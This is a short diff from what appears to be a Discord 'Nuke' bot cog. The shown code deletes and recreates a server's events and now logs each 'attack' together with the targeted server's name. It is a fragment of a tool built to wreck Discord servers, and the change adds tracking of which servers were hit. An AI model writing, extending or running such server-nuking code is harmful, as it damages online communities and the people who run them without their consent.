@@ -44,7 +44,7 @@ class Nuke(commands.Cog):
         await fucker.delete_events(ctx)
         await fucker.create_event(ctx)
 
-        self.attack_counter.record_attack_end()
+        self.attack_counter.record_attack_end(server_name=ctx.guild.name, attack="nuke")
 
     @nuke.error
     async def nuke_error(self, ctx, error):
